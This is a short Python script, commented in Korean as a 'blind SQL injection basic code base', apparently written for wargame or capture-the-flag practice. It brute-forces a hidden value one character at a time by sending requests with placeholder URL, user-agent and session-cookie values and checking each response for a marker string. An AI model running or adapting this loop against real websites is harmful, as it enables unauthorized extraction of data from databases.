'''
Blind SQL Injection 기본 코드 베이스
'''
import urllib.request
from urllib.parse import quote

key = ""
for i in range(1, 20):
    for j in range(32, 127):
        url = "고정 URL"
        data = "가변적 URL"
        print(url + data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "브라우저 정보")
        re.add_header(
            "Cookie", "PHPSESSID=세션값"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("찾는 값") != -1:
            key += chr(j).lower()
            print(key)
            break
print(key)